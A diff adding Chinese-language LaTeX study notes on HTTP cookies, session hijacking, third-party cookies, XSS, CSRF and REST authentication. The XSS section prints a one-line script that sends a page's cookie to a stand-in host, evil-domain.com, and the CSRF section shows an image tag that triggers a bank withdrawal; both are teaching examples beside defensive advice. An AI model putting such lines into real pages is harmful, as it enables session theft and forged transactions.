@@ -1,0 +1,166 @@
+\chapter{Web}
+
+\subsubsection{Cookies}
+
+http://www.nczonline.net/blog/2009/05/05/http-cookies-explained/
+
+cookie是一个储存在用户机器上的小的text文件，包含的是不可执行的文本。web page或者服务器告诉浏览器保存这些信息，并且在接下来的请求中按一定的规则附带这些信息，服务器可以使用这些信息来区分不同的用户。
+
+web服务器通过HTTP header：Set-Cookie来告诉浏览器保存cookie。
+\begin{HTML5}
+Set-Cookie: value[; expires=date][; domain=domain][; path=path][; secure]
+\end{HTML5}
+
+第一部分value一般来说是一个字符串，他的格式是name=value.
+
+当cookie存在，而规则准许的情况下，cookie会在后面的请求被发送到服务器。
+
+cookie会被保存在HTTP header：Cookie中
+\begin{HTML5}
+Cookie: value
+\end{HTML5}
+在Set-Cookie中的option选项是只被浏览器使用，Cookie头中的Value和Set-Cookie中的是一样的字符串。
+
+如果有多个值，他们之间使用分号隔开
+\begin{HTML5}
+Cookie: value1; value2; name1=value1
+\end{HTML5}
+
+每一个选项通过分号和空格隔开。
+
+第一个是expires，说明什么时候cookie不需要再发送给web服务器，并且可能被浏览器删除掉，这个选项的值是一个Date
+\begin{HTML5}
+Set-Cookie: name=Nicholas; expires=Sat, 02 May 2009 23:38:25 GMT
+\end{HTML5}
+如果没有定义expires，cookie的生命周期是单个的session。session的结束定义为浏览器关闭。这也是为什么每次登陆都有一个选框问是不是要保存登陆记录。如果expires的时间是一个过去的时间，那么他将被删除掉。
+
+domain选项，指定cookie改发送到哪个domain。默认情况下，domain被设定为当前页面的host name。自己设定的domain只能是设定cookie页面的host name的一部分。
+
+path和domain的功能类似，发送cookie前先要判断path在发送的页面中。
+
+\begin{HTML5}
+Set-Cookie: name=Nicholas; path=/blog
+\end{HTML5}
+
+最后是secure， 这个没有值。如果有这个选项，则cookie只有在SSL或者是HTTPS的时候才会发送。cookie通过HTTPS设定的时候，自动被加上secure选项。
+
+当cookie设定时，可以使用任意的选项
+\begin{HTML5}
+Set-Cookie: name=Nicholas; domain=nczonline.net; path=/blog
+\end{HTML5}
+如果设定的时候这些选项，在重新设定cookie的值得时候，name，domain和path都需要带，而且相同才能设定。
+\begin{HTML5}
+Set-Cookie: name=Greg; domain=nczonline.net; path=/blog
+\end{HTML5}
+如果选项值不同，也会创建新的cookie。
+
+当有多个相同名字的cookie被设定是，总是按最匹配的顺序一起发送
+
+比如有
+\begin{HTML5}
+Set-Cookie: name=Greg; domain=nczonline.net; path=/blog
+Set-Cookie: name=Nicholas; domain=nczonline.net; path=/
+Set-Cookie: name=Mike
+\end{HTML5}
+
+则返回的的是：
+
+\begin{HTML5}
+Cookie: name=Mike; name=Greg; name=Nicholas
+\end{HTML5}
+
+当要修改expires的时候，name-domain-path-secure必须要都相同的时候，才能够修改。而当修改name的value的时候，则不需要指定expires。
+
+JavaScript中使用document.cookie = ...来设定cookie，...的字符串和Set-Cookie头中应该是一样的。
+
+httpOnly选项是的javascript无法访问当前这个cookie。
+
+
+\paragraph{session hijacking} session劫持,因为是通过明文传递的。
+
+三个方案来防止session hijacking。
+\begin{itemize}
+
+\item 只通过SLL来发送cookie
+\item 使用用户信息（用户名，IP，时间戳）或者随即的方式来产生session key，使得很难重用session key
+\item 在进行一些安全级别要求较高的操作时，要求重新做验证。
+\end{itemize}
+
+\paragraph{Third-Party Cookies} 第三方cookies
+
+\begin{itemize}
+\item link tag包含的CSS文件
+\item script tag包含的js文件
+\item object或者embed tag包含的meida文件
+\item iframe tag包含的html文件
+\end{itemize}
+
+对于第三方server，可以根据请求头中包含的Referer头来判断这个请求是从哪个site过来的。服务器可以使用一个特定的cookie来表示这个请求页面，如果同一个资源从另外一个页面请求过来，cookie也会随着请求一起放松过来。这样第三方服务器就能够知道访问Site A的用户同时也访问了Site B。这是在线广告使用的一种技术。
+
+
+\paragraph{Cookie Stealing \& XSS} Cookie偷取 cross-site scripting attack
+
+在同一个页面的所有JavaScript都运行在同一个domain下，有相同的path，和页面相同的协议。这表示从其他domain导入的script可以通过读取document.cookie来获得页面的cookie。
+
+比如说从第三方evil-domain.com导入了一些有用的code，如果在evil-domain.com的家伙将代码换成下面的代码的话。
+\begin{JavaScript}
+(new Image()).src = "http://www.evil-domain.com/cookiestealer.php?cookie=" + cookie.domain;
+\end{JavaScript}
+他们就悄悄的取得了我的页面的cookie，这样他们就可以轻松的进行其他攻击，如session hijacking.
+
+当由于导入第三方脚本造成的攻击，我们称为XSS(cross-site scripting attack).
+
+cookie stealing不单只是因为导入了第三方脚本导致，对input缺乏过滤也可能造成cookie stealing。如果输入可以输出到一个页面，而输入中包含了 \lstinline$<script>$标签在其中，也可能导致脚本运行。
+
+
+\paragraph{CSRF} Cross-site Request Forgery
+
+攻击者让浏览器以登陆的用户做一些有害的操作。
+
+比如说，有人在没有验证输入的论坛上面发布了一条消息。消息内容是
+\begin{JavaScript}
+<img src="http://bank.example/withdraw?account=bob&amount=1000000&for=mallory">
+\end{JavaScript}
+
+当你登陆银行账号之后，访问了这个页面，这个请求会被发送出去，相应的cookie会被带上。这样你就会在不知情的情况下将钱转走。
+
+
+CSRF很难track，所以阻止是关键。
+
+\begin{itemize}
+\item 不要包含不守信用的domian的脚本。
+\item 一定要对用户的输入过滤。
+\item Require validation not just with cookies, but also by referrer and or request type (POST instead of GET).
+\end{itemize}
+
+\begin{itemize}
+\item Require confirmation for any sensitive action
+\item Cookies that validate users in systems with sensitive data should have a short expiration time.
+\end{itemize}
+
+\subsubsection{authentication with a REST API}
+http://stackoverflow.com/questions/15051712/how-to-do-authentication-with-a-rest-api-right-browser-native-clients
+
+\paragraph{HTTP session Vs. stateless auth token} what's the difference?
+
+HTTP Session:
+
+\begin{enumerate}
+\item Client requests a URL (first request to the server)
+\item Server gives the normal response plus some unique string (== session ID)
+\item Client has to send this string with every request (which is done automatically using HTTP header)
+\item Client logs in -> Server memorizes that this particular session ID is now logged in
+\item Client visits a page which requires auth -> Nothing special to do, because the session ID will automatically get sent to the server via HTTP header
+\end{enumerate}
+
+stateless auth token:
+
+\begin{enumerate}
+\item Client request URL (first request to the server)
+\item Server just gives the normal response without any key or token or id
+\item (nothing special here)
+\item Client logs in -> Server creates an auth token and sends this token to the client inside the response
+\item Client visits page which requires auth -> Client has to submit the auth token
+\end{enumerate}
+
+
